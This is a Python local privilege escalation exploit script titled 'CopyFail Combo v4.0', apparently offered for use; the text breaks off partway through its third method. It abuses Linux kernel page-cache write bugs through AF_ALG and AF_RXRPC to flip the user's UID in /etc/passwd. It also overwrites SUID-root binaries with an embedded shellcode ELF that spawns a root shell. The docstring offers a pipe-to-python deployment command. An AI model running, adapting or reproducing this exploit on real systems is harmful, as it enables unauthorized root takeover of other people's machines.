#!/usr/bin/env python3
"""
CopyFail Combo v4.0 — Multi-Method Local Privilege Escalation
CopyFail + DirtyCBC + DirtyFrag + Pack2TheRoot

Methods (tried in order, each isolated — failure never blocks next):
  1. CopyFail /etc/passwd UID flip — AF_ALG authencesn 4-byte page cache write
  2. CopyFail binary mutation — AF_ALG, tries ALL SUID binaries until root
  3. DirtyCBC binary mutation — RxGK chosen-plaintext, tries ALL SUID binaries
  4. DirtyFrag (ESP + RxRPC auto-chain) — compiled C, handles own shell
  5. Pack2TheRoot (PackageKit TOCTOU) — D-Bus race condition

CopyFail (M1/M2):
  AF_ALG authencesn in-place optimization bug + splice() = controlled
  4-byte write into any file's page cache. Disk untouched.
  100% reliable, no race window to win.

DirtyCBC (M3):
  RxGK token-decrypt in-place AEAD over MSG_SPLICE_PAGES'd skb frags.
  AES-CBC IV-XOR + RFC 3962 CTS-CS3 swap = chosen-plaintext 16-byte
  blocks into page cache. Needs AF_RXRPC + libcrypto.so. No compiler.

DirtyFrag (M4):
  ESP: xfrm-ESP skip_cow + splice() 4-byte write via ESN seq_hi.
  RxRPC: rxkad in-place pcbc(fcrypt) decrypt + splice() 8-byte write.
  Auto-chains: tries ESP first, falls back to RxRPC, spawns PTY shell.

Pack2TheRoot (M5):
  PackageKit transaction flag overwrite via repeated D-Bus InstallFiles.

Deploy: curl -sSL URL | python3
Local:  python3 copyfail_combo_v4.py

Compatibility: Python 3.6+
"""

import ctypes
import ctypes.util
import errno
import fcntl
import os
import select
import shutil
import struct
import subprocess
import sys
import time
import zlib

try:
    import socket
except ImportError:
    socket = None
try:
    import pwd
except ImportError:
    pwd = None

# ──────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE = 0x8000

AF_RXRPC = 33
SOL_RXRPC = 272
RXRPC_SECURITY_KEYRING = 2
RXRPC_USER_CALL_ID = 1
RXRPC_CHARGE_ACCEPT = 14
RXRPC_PACKET_TYPE_DATA = 1
RXRPC_PACKET_TYPE_ACK = 2
RXRPC_PACKET_TYPE_ABORT = 4
RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_PACKET_TYPE_RESPONSE = 7
RXRPC_CLIENT_INITIATED = 0x01
RXRPC_LAST_PACKET = 0x04

SYS_add_key = 248
SYS_keyctl = 250
KEY_SPEC_SESSION_KEYRING = -3
KEYCTL_JOIN_SESSION_KEYRING = 1
KEYCTL_SETPERM = 5
F_SETPIPE_SZ = 1031

RXGK_SERVER_ENC_TOKEN = 1036

PK_SUID = "/tmp/.s"
AUTHENC_KEY = bytes.fromhex('0800010000000010') + b'\x00' * 32

PAYLOAD_X86_64 = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

SUID_ORDER = [
    "/usr/bin/newgrp", "/usr/bin/chfn", "/usr/bin/chsh",
    "/usr/bin/gpasswd", "/usr/bin/wall", "/usr/bin/expiry",
    "/usr/bin/sg", "/usr/bin/at", "/usr/bin/crontab",
    "/usr/bin/mount", "/usr/bin/umount",
    "/usr/bin/fusermount3", "/usr/bin/fusermount",
    "/usr/bin/pkexec",
    "/usr/bin/passwd", "/usr/bin/su", "/bin/su", "/usr/bin/sudo",
]

ALGOS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
    "authencesn(hmac(sha256),cbc(camellia))",
    "authencesn(hmac(sha256),rfc3686(ctr(aes)))",
]

# DirtyCBC RxGK parameters
_RXGK_SRV_PORT = 7000
_RXGK_SVC_ID = 1234
_RXGK_KVNO = 1
_RXGK_ENCTYPE = 18
_RXGK_KEY_LEN = 32
_RXGK_KR_NAME = b"rxgk_poc_kr"


def log(msg, end="\n"):
    sys.stderr.write(str(msg) + end)
    sys.stderr.flush()


def qrun(cmd, **kw):
    try:
        return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, **kw)
    except Exception:
        return None


# ──────────────────────────────────────────────────
# SPLICE ABSTRACTION (Python 3.6+ via ctypes)
# ──────────────────────────────────────────────────

_splice_fn = None
_splice_native = False


def init_splice():
    global _splice_fn, _splice_native
    if hasattr(os, 'splice'):
        _splice_fn = os.splice
        _splice_native = True
        return True
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c') or "libc.so.6",
                           use_errno=True)
        libc.splice.argtypes = [
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_size_t, ctypes.c_uint,
        ]
        libc.splice.restype = ctypes.c_ssize_t

        def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
            oi = ctypes.byref(ctypes.c_int64(offset_src)) if offset_src is not None else None
            oo = ctypes.byref(ctypes.c_int64(offset_dst)) if offset_dst is not None else None
            r = libc.splice(fd_in, oi, fd_out, oo, count, 0)
            if r < 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return r

        _splice_fn = _splice
        _splice_native = False
        return True
    except Exception:
        return False


def do_splice(fd_in, fd_out, count, offset_src=None):
    if _splice_native:
        if offset_src is not None:
            return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)
        return _splice_fn(fd_in, fd_out, count)
    return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)


# ──────────────────────────────────────────────────
# AF_ALG CORE
# ──────────────────────────────────────────────────

_algo = None


def find_algo():
    global _algo
    if _algo:
        return _algo

    mods = [
        "af_alg", "algif_aead", "algif_skcipher",
        "authenc", "hmac",
        "sha256", "sha256_generic",
        "aes", "aes_generic", "aes_x86_64",
        "cbc", "ctr", "camellia",
    ]
    for m in mods:
        qrun(["modprobe", m], timeout=3)

    try:
        t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        t.close()
    except Exception:
        pass

    for trigger_algo in ["cbc(aes)", "hmac(sha256)"]:
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("skcipher", trigger_algo))
            t.close()
        except Exception:
            pass
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("hash", trigger_algo))
            t.close()
        except Exception:
            pass

    for a in ALGOS:
        try:
            s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            s.bind(("aead", a))
            s.close()
            _algo = a
            return a
        except (OSError, PermissionError):
            continue
    return None


def patch_4b(file_fd, offset, data_4b):
    ctrl = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    ctrl.bind(("aead", _algo))
    ctrl.setsockopt(SOL_ALG, ALG_SET_KEY, AUTHENC_KEY)
    ctrl.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    op, _ = ctrl.accept()

    n = offset + 4
    op.sendmsg(
        [b'AAAA' + data_4b],
        [
            (SOL_ALG, ALG_SET_OP, struct.pack('I', ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack('I', 16) + b'\x00' * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack('I', 8)),
        ],
        MSG_MORE,
    )

    r, w = os.pipe()
    do_splice(file_fd, w, n, offset_src=0)
    do_splice(r, op.fileno(), n)

    try:
        op.recv(8 + offset)
    except Exception:
        pass

    os.close(r)
    os.close(w)
    op.close()
    ctrl.close()


# ──────────────────────────────────────────────────
# SUID DISCOVERY
# ──────────────────────────────────────────────────

def _is_suid_root_readable(path):
    try:
        if not os.path.isfile(path):
            return False
        st = os.stat(path)
        return (st.st_mode & 0o4000) and st.st_uid == 0 and os.access(path, os.R_OK)
    except (OSError, PermissionError):
        return False


def find_all_suid():
    found = set()
    ordered = []

    for p in SUID_ORDER:
        if _is_suid_root_readable(p) and p not in found:
            found.add(p)
            ordered.append(p)

    for dirs in [
        ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin",
         "/usr/lib", "/usr/libexec"],
        ["/"],
    ]:
        try:
            cmd = ["find"] + dirs + ["-perm", "-4000", "-type", "f",
                   "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=15 if "/" not in dirs else 30)
            for line in r.stdout.strip().split("\n"):
                p = line.strip()
                if p and p not in found and _is_suid_root_readable(p):
                    found.add(p)
                    ordered.append(p)
        except Exception:
            continue
        if ordered:
            break

    return ordered


# ──────────────────────────────────────────────────
# AUTO ROOT SHELL
# ──────────────────────────────────────────────────

def _reattach_tty():
    try:
        tty = os.open("/dev/tty", os.O_RDWR)
        os.dup2(tty, 0)
        os.dup2(tty, 1)
        os.dup2(tty, 2)
        os.close(tty)
    except OSError:
        pass


def auto_root_exec(binary):
    log("[+++] ROOT — dropping to shell")
    _reattach_tty()
    os.execl(binary, binary)


def auto_root_su(username):
    log("[+++] ROOT — su %s" % username)
    _reattach_tty()
    os.execlp("su", "su", username)


# ──────────────────────────────────────────────────
# METHOD 1: CopyFail /etc/passwd UID Flip
# ──────────────────────────────────────────────────

def try_passwd_flip():
    log("\n[=== METHOD 1: CopyFail /etc/passwd UID Flip ===]")

    if pwd is None:
        log("[-] pwd module unavailable")
        return False

    uid = os.getuid()
    if uid < 1000 or uid > 9999:
        log("[-] UID %d not 4-digit (need 1000-9999)" % uid)
        return False

    try:
        pw = pwd.getpwuid(uid)
    except KeyError:
        log("[-] UID %d not in passwd DB" % uid)
        return False

    if not os.access("/etc/passwd", os.R_OK):
        log("[-] /etc/passwd not readable")
        return False

    with open("/etc/passwd", "r") as f:
        content = f.read()

    search = "%s:" % pw.pw_name
    pos = content.find(search)
    if pos < 0:
        log("[-] %s not found in /etc/passwd" % pw.pw_name)
        return False

    after = pos + len(search)
    try:
        colon1 = content.index(":", after)
    except ValueError:
        log("[-] Malformed /etc/passwd line")
        return False
    uid_off = colon1 + 1

    expected = "%04d" % uid
    actual = content[uid_off:uid_off + 4]
    if actual != expected:
        log("[-] Sanity fail: expected '%s' at %d, got '%s'" % (expected, uid_off, actual))
        return False

    log("[+] %s uid=%d offset=%d" % (pw.pw_name, uid, uid_off))
    log("[*] Flipping UID -> 0000 in page cache...")

    fd = os.open("/etc/passwd", os.O_RDONLY)
    try:
        patch_4b(fd, uid_off, b"0000")
    except Exception as e:
        os.close(fd)
        log("[-] Patch failed: %s" % e)
        return False
    os.close(fd)

    with open("/etc/passwd", "r") as f:
        verify = f.read()[uid_off:uid_off + 4]

    if verify == "0000":
        log("[+++] UID flip VERIFIED in page cache!")
        # Chain to SUID binary mutation for passwordless root shell.
        # UID flip alone requires password via PAM; binary mutation
        # gives direct setuid(0)+execve("/bin/sh") without auth.
        root_via = _passwd_flip_get_shell(pw.pw_name)
        if not root_via:
            log("[*] Falling back to su (enter YOUR password for root shell)")
            auto_root_su(pw.pw_name)
        return True

    log("[-] Verify failed: got '%s' (expected '0000')" % verify)
    return False


def _passwd_flip_get_shell(username):
    """After UID flip to 0, get root shell without password."""
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        return False

    payload = PAYLOAD_X86_64
    suids = find_all_suid()
    if not suids:
        return False

    log("[*] Chaining: patching SUID binary for passwordless shell...")
    for target in suids:
        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError):
            continue

        total = len(payload)
        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except Exception:
            try:
                os.close(fd)
            except OSError:
                pass
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        verify_slice = slice(24, 32)
        if readback[verify_slice] == payload[verify_slice]:
            log("[+++] %s patched — exec for root shell" % target)
            auto_root_exec(target)
            return True

    return False


# ──────────────────────────────────────────────────
# METHOD 2: CopyFail Binary Mutation
# ──────────────────────────────────────────────────

def try_binary_mutation():
    log("\n[=== METHOD 2: CopyFail Binary Mutation ===]")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] No payload for %s" % arch)
        return False

    payload = PAYLOAD_X86_64
    log("[*] Payload: %dB x86_64 ELF (setuid+execve /bin/sh)" % len(payload))

    suids = find_all_suid()
    if not suids:
        log("[-] No readable SUID-root binaries found")
        return False

    log("[+] %d SUID candidates" % len(suids))

    verify_slice = slice(24, 32)
    expected_verify = payload[verify_slice]

    for idx, target in enumerate(suids):
        log("\n  [%d/%d] %s" % (idx + 1, len(suids), target))

        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError) as e:
            log("    [-] open: %s" % e)
            continue

        total = len(payload)
        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except OSError as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log("    [-] patch error: %s" % e)
            if e.errno == 22:
                log("    [-] EINVAL — seccomp/AppArmor may be blocking AF_ALG")
            continue
        except Exception as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log("    [-] %s: %s" % (type(e).__name__, e))
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        if readback[verify_slice] == expected_verify:
            log("    [+++] Page cache VERIFIED — %s is our payload now" % target)
            auto_root_exec(target)
            return True
        else:
            log("    [-] Verify mismatch")
            continue

    log("\n[-] Exhausted all %d SUID binaries" % len(suids))
    return False


# ──────────────────────────────────────────────────
# DIRTYCBC: libcrypto + RFC 3961 + RxGK attack
# ──────────────────────────────────────────────────

_crypto = None
_libc_cbc = None
_rxgk_Ke = None
_rxgk_secret = None


def _load_libcrypto():
    global _crypto
    for cand in ("libcrypto.so.3", "libcrypto.so.1.1", "libcrypto.so"):
        try:
            _crypto = ctypes.CDLL(cand, use_errno=True)
            _crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
            _crypto.EVP_CIPHER_CTX_new.argtypes = []
            _crypto.EVP_CIPHER_CTX_free.restype = None
            _crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
            _crypto.EVP_aes_256_ecb.restype = ctypes.c_void_p
            _crypto.EVP_aes_256_ecb.argtypes = []
            _crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
            _crypto.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                                    ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]
            _crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
            _crypto.EVP_DecryptInit_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                                    ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]
            _crypto.EVP_CIPHER_CTX_set_padding.restype = ctypes.c_int
            _crypto.EVP_CIPHER_CTX_set_padding.argtypes = [ctypes.c_void_p, ctypes.c_int]
            _crypto.EVP_EncryptUpdate.restype = ctypes.c_int
            _crypto.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                                   ctypes.POINTER(ctypes.c_int),
                                                   ctypes.c_char_p, ctypes.c_int]
            _crypto.EVP_DecryptUpdate.restype = ctypes.c_int
            _crypto.EVP_DecryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                                   ctypes.POINTER(ctypes.c_int),
                                                   ctypes.c_char_p, ctypes.c_int]
            return True
        except OSError:
            continue
    return False


def _load_libc_cbc():
    global _libc_cbc
    _libc_cbc = ctypes.CDLL("libc.so.6", use_errno=True)
    _libc_cbc.syscall.restype = ctypes.c_long
    _libc_cbc.bind.restype = ctypes.c_int
    _libc_cbc.bind.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_uint]
    _libc_cbc.vmsplice.restype = ctypes.c_long
    _libc_cbc.vmsplice.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_uint]
    _libc_cbc.splice.restype = ctypes.c_long
    _libc_cbc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
                                  ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
                                  ctypes.c_size_t, ctypes.c_uint]
    return True


def _aes256_ecb(do_encrypt, key, in_block):
    assert len(key) == 32 and len(in_block) == 16
    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        return None
    try:
        cipher = _crypto.EVP_aes_256_ecb()
        if do_encrypt:
            _crypto.EVP_EncryptInit_ex(ctx, cipher, None, key, None)
        else:
            _crypto.EVP_DecryptInit_ex(ctx, cipher, None, key, None)
        _crypto.EVP_CIPHER_CTX_set_padding(ctx, 0)
        out = ctypes.create_string_buffer(16)
        outlen = ctypes.c_int(0)
        if do_encrypt:
            _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), in_block, 16)
        else:
            _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), in_block, 16)
        return out.raw[:16]
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


def _gcd(a, b):
    while b:
        a, b = b, a % b
    return a


def _lcm(a, b):
    return a // _gcd(a, b) * b


def _nfold(buf, outlen):
    inlen = len(buf)
    ulcm = _lcm(inlen, outlen)
    out = bytearray(outlen)
    byte = 0
    for i in range(ulcm - 1, -1, -1):
        msbit = (((inlen * 8) - 1)
                 + (((inlen * 8) + 13) * (i // inlen))
                 + ((inlen - (i % inlen)) * 8)) % (inlen * 8)
        byte += (((buf[((inlen - 1) - (msbit >> 3)) % inlen] << 8)
                  | buf[(inlen - (msbit >> 3)) % inlen])
                 >> ((msbit & 7) + 1)) & 0xff
        byte += out[i % outlen]
        out[i % outlen] = byte & 0xff
        byte >>= 8
    if byte:
        for i in range(outlen - 1, -1, -1):
            byte += out[i]
            out[i] = byte & 0xff
            byte >>= 8
    return bytes(out)


def _dk_aes256(K, constant):
    inblock = constant if len(constant) == 16 else _nfold(constant, 16)
    k1 = _aes256_ecb(True, K, inblock)
    k2 = _aes256_ecb(True, K, k1)
    return k1 + k2


def _compute_Ke(K):
    constant = bytes([0, 0, (RXGK_SERVER_ENC_TOKEN >> 8) & 0xff,
                      RXGK_SERVER_ENC_TOKEN & 0xff, 0xAA])
    return _dk_aes256(K, constant)


class _Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]


def _vmsplice_bufs(pipe_w_fd, buffers):
    n = len(buffers)
    arr = (_Iovec * n)()
    refs = []
    for i, buf in enumerate(buffers):
        cbuf = ctypes.c_char * len(buf)
        if isinstance(buf, bytes):
            backing = cbuf.from_buffer_copy(buf)
        else:
            backing = cbuf.from_buffer(buf)
        refs.append(backing)
        arr[i].iov_base = ctypes.addressof(backing)
        arr[i].iov_len = len(buf)
    ret = _libc_cbc.vmsplice(pipe_w_fd, ctypes.byref(arr), n, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "vmsplice")
    return ret


def _splice_file(in_fd, in_off, out_fd, length):
    off = ctypes.c_longlong(in_off)
    ret = _libc_cbc.splice(in_fd, ctypes.byref(off), out_fd, None, length, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "splice_file")
    return ret


def _splice_drain(in_fd, out_fd, length):
    ret = _libc_cbc.splice(in_fd, None, out_fd, None, length, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "splice_drain")
    return ret


def _key_add(ktype, desc, payload, ringid):
    plen = 0 if payload is None else len(payload)
    pbuf = payload if payload is not None else b""
    n = _libc_cbc.syscall(ctypes.c_long(SYS_add_key),
                           ctypes.c_char_p(ktype),
                           ctypes.c_char_p(desc),
                           ctypes.c_char_p(pbuf),
                           ctypes.c_size_t(plen),
                           ctypes.c_int(ringid))
    if n < 0:
        raise OSError(ctypes.get_errno(), "add_key")
    return n


def _keyctl(op, *args):
    fixed = []
    for a in args:
        if a is None:
            fixed.append(ctypes.c_void_p(0))
        elif isinstance(a, int):
            fixed.append(ctypes.c_ulong(a))
        else:
            fixed.append(a)
    return _libc_cbc.syscall(ctypes.c_long(SYS_keyctl), ctypes.c_ulong(op), *fixed)


def _pack_rxrpc_hdr(epoch, cid, callN, seq, serial, type_, flags, sec_idx, svc_id):
    return struct.pack("!IIIII BBBB HH",
                        epoch, cid, callN, seq, serial,
                        type_, flags, 0, sec_idx, 0, svc_id)


def _xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


# 192-byte ELF dropper: setuid(0) + execve("/bin/sh")
def _build_tiny_elf():
    e_hdr = b"".join([
        b"\x7fELF\x02\x01\x01\x00", b"\x00" * 8,
        struct.pack("<H", 2), struct.pack("<H", 0x3e),
        struct.pack("<I", 1), struct.pack("<Q", 0x10000078),
        struct.pack("<Q", 64), struct.pack("<Q", 0),
        struct.pack("<I", 0), struct.pack("<H", 64),
        struct.pack("<H", 56), struct.pack("<H", 1),
        struct.pack("<H", 0), struct.pack("<H", 0), struct.pack("<H", 0),
    ])
    phe = b"".join([
        struct.pack("<I", 1), struct.pack("<I", 5),
        struct.pack("<Q", 0), struct.pack("<Q", 0x10000000),
        struct.pack("<Q", 0x10000000), struct.pack("<Q", 192),
        struct.pack("<Q", 192), struct.pack("<Q", 0x1000),
    ])
    sc = bytes.fromhex(
        "31ff" "b069" "0f05"
        "48b8" "2f62696e2f736800"
        "50" "4889e7" "31f6" "31d2" "31c0" "b03b" "0f05"
    )
    pad = b"\xcc" * (192 - len(e_hdr) - len(phe) - len(sc))
    return e_hdr + phe + sc + pad


_DIRTYCBC_ELF = _build_tiny_elf()


def _dirtycbc_init():
    """Initialize DirtyCBC: libcrypto + libc + RxGK key derivation."""
    global _rxgk_secret, _rxgk_Ke
    if not _load_libcrypto():
        return False
    _load_libc_cbc()
    _rxgk_secret = os.urandom(_RXGK_KEY_LEN)
    _rxgk_Ke = _compute_Ke(_rxgk_secret)
    if _rxgk_Ke is None:
        return False
    return True


def _trigger_rxrpc_key_type():
    """Force-load the rxrpc_s key type via every known trigger."""
    # Direct module loads
    for mod in ["af_rxrpc", "rxrpc", "rxgk", "rxkad",
                "key-type-rxrpc_s", "net-pf-33"]:
        qrun(["modprobe", mod], timeout=3)

    # Socket creation triggers net-pf-33 → af_rxrpc which registers rxrpc_s
    for _ in range(2):
        try:
            s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
            s.close()
        except OSError:
            pass

    # Bind attempt triggers security class registration
    try:
        s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
        sin = struct.pack("=H H 4s 8s", socket.AF_INET,
                           socket.htons(17999), socket.inet_aton("127.0.0.1"),
                           b"\x00" * 8)
        srx = struct.pack("=H H H H", AF_RXRPC, 0,
                           socket.SOCK_DGRAM, len(sin)) + sin
        _libc_cbc.bind(s.fileno(), srx, len(srx))
        s.close()
    except OSError:
        pass

    # request_key trigger — kernel calls request_module("key-type-rxrpc_s")
    try:
        _libc_cbc.syscall(ctypes.c_long(SYS_keyctl),
                           ctypes.c_ulong(23),  # KEYCTL_CAPABILITIES (harmless probe)
                           ctypes.c_void_p(0), ctypes.c_size_t(0))
    except Exception:
        pass

    time.sleep(0.3)


def _test_rxrpc_key_type():
    """Check if rxrpc_s key type is available without side effects."""
    # Check /proc/keys key types
    try:
        with open("/proc/keys", "r") as f:
            pass  # readable = key subsystem works
    except (OSError, PermissionError):
        pass

    # Try a dummy add_key to test the key type — use invalid ring so it
    # fails fast but still triggers the module load
    try:
        _libc_cbc.syscall(ctypes.c_long(SYS_add_key),
                           ctypes.c_char_p(b"rxrpc_s"),
                           ctypes.c_char_p(b"0:2:1:17"),
                           ctypes.c_char_p(b"\x00" * 8),
                           ctypes.c_size_t(8),
                           ctypes.c_int(-4))  # KEY_SPEC_REQKEY_AUTH_KEY = invalid
    except Exception:
        pass


def _dirtycbc_setup_keyring():
    """Set up AF_RXRPC keyring with our controlled server key."""
    rc = _keyctl(KEYCTL_JOIN_SESSION_KEYRING, None)
    if rc < 0:
        # Fallback: join with a named keyring
        _libc_cbc.syscall(ctypes.c_long(SYS_keyctl),
                           ctypes.c_ulong(KEYCTL_JOIN_SESSION_KEYRING),
                           ctypes.c_char_p(b"rxgk_session"))

    kr = _key_add(b"keyring", _RXGK_KR_NAME, None, KEY_SPEC_SESSION_KEYRING)

    # Try security index 6 (RxGK) first, fall back to 2 (rxkad)
    last_err = None
    for sec_idx, key_fmt in [
        (6, "%d:6:%d:%d"),   # RxGK: svc:6:kvno:enctype
        (2, "%d:2:%d"),      # rxkad: svc:2:kvno
    ]:
        desc = (key_fmt % ((_RXGK_SVC_ID, _RXGK_KVNO, _RXGK_ENCTYPE)
                if sec_idx == 6 else (_RXGK_SVC_ID, _RXGK_KVNO))).encode()

        # Build proper key payload based on security class
        if sec_idx == 6:
            # RxGK: raw key bytes
            payload = _rxgk_secret
        else:
            # rxkad: struct rxrpc_key_data_v1 { u16 security_index; u16 ticket_length;
            #         u32 expiry; u8 kvno; u8 session_key[8]; u8 ticket[] }
            payload = struct.pack("=HHI", sec_idx, 0, 0xFFFFFFFF)
            payload += struct.pack("B", _RXGK_KVNO)
            payload += _rxgk_secret[:8]

        try:
            k = _key_add(b"rxrpc_s", desc, payload, kr)
            _keyctl(KEYCTL_SETPERM, kr, 0x3f3f3f3f)
            _keyctl(KEYCTL_SETPERM, k, 0x3f3f3f3f)
            log("[+] rxrpc_s key added (sec_idx=%d, key_id=%d)" % (sec_idx, k))
            return kr, sec_idx
        except OSError as e:
            last_err = e
            continue

    raise last_err


def _dirtycbc_open_server():
    """Open AF_RXRPC server socket."""
    s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
    s.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEYRING, _RXGK_KR_NAME)
    sin = struct.pack("=H H 4s 8s",
                       socket.AF_INET,
                       socket.htons(_RXGK_SRV_PORT),
                       socket.inet_aton("127.0.0.1"),
                       b"\x00" * 8)
    srx = struct.pack("=H H H H", AF_RXRPC, _RXGK_SVC_ID,
                       socket.SOCK_DGRAM, len(sin)) + sin
    rc = _libc_cbc.bind(s.fileno(), srx, len(srx))
    if rc != 0:
        raise OSError(ctypes.get_errno(), "rxrpc bind")
    s.listen(8)
    return s


def _dirtycbc_charge(srv, n):
    for i in range(n):
        uid = 0x1000 + i
        ancdata = [
            (SOL_RXRPC, RXRPC_USER_CALL_ID, struct.pack("=Q", uid)),
            (SOL_RXRPC, RXRPC_CHARGE_ACCEPT, b""),
        ]
        srv.sendmsg([], ancdata, 0)


def _dirtycbc_attack_batch(target_path, chosen_bytes, target_off, sec_idx=6):
    """One batch of the chosen-plaintext attack."""
    chosen_len = len(chosen_bytes)
    nblocks = chosen_len // 16

    tfd = os.open(target_path, os.O_RDONLY)
    target_blocks = os.pread(tfd, chosen_len, target_off)
    if len(target_blocks) != chosen_len:
        os.close(tfd)
        return False

    user_bufs = bytearray(16 * nblocks)
    for i in range(nblocks):
        target_i = target_blocks[16 * i: 16 * (i + 1)]
        chosen_i = chosen_bytes[16 * i: 16 * (i + 1)]
        if i < nblocks - 1:
            dec = _aes256_ecb(False, _rxgk_Ke, target_i)
            user_bufs[16 * i:16 * (i + 1)] = _xor_bytes(dec, chosen_i)
        else:
            xor_in = _xor_bytes(chosen_i, target_i)
            user_bufs[16 * i:16 * (i + 1)] = _aes256_ecb(True, _rxgk_Ke, xor_in)

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp.bind(("127.0.0.1", 0))

    try:
        epoch = 0xDEADBEEF
        cid = 0x10000000 + ((target_off & 0xFFFFFFF) << 4)
        hdr = _pack_rxrpc_hdr(epoch, cid, 1, 1, 1,
                               RXRPC_PACKET_TYPE_DATA,
                               RXRPC_CLIENT_INITIATED | RXRPC_LAST_PACKET,
                               sec_idx, _RXGK_SVC_ID)
        udp.sendto(hdr + b"\xaa" * 16, ("127.0.0.1", _RXGK_SRV_PORT))

        ch_pkt = None
        src = None
        for _ in range(8):
            ready, _, _ = select.select([udp], [], [], 2.0)
            if not ready:
                break
            data, src = udp.recvfrom(2048)
            if len(data) >= 28:
                t = data[20] if isinstance(data[20], int) else ord(data[20])
                if t == RXRPC_PACKET_TYPE_CHALLENGE:
                    ch_pkt = data
                    break

        if ch_pkt is None:
            os.close(tfd)
            return False

        ch_epoch, ch_cid = struct.unpack_from("!II", ch_pkt, 0)
        ticket_len = 32 * nblocks + 12
        token_len = 12 + ticket_len

        rmal = _pack_rxrpc_hdr(ch_epoch, ch_cid, 0, 0, 2,
                                RXRPC_PACKET_TYPE_RESPONSE,
                                RXRPC_CLIENT_INITIATED, sec_idx, _RXGK_SVC_ID)
        hdr_pre = struct.pack("!Q I I I I", 0, token_len,
                               _RXGK_KVNO, _RXGK_ENCTYPE, ticket_len)
        hmac_zone = b"\x00" * 12
        hdr_post = struct.pack("!I", 56) + b"\xcc" * 56

        udp.connect(src)

        rfd, wfd = os.pipe()
        try:
            fcntl.fcntl(wfd, F_SETPIPE_SZ, 1 << 20)
            _vmsplice_bufs(wfd, [rmal + hdr_pre])
            for i in range(nblocks):
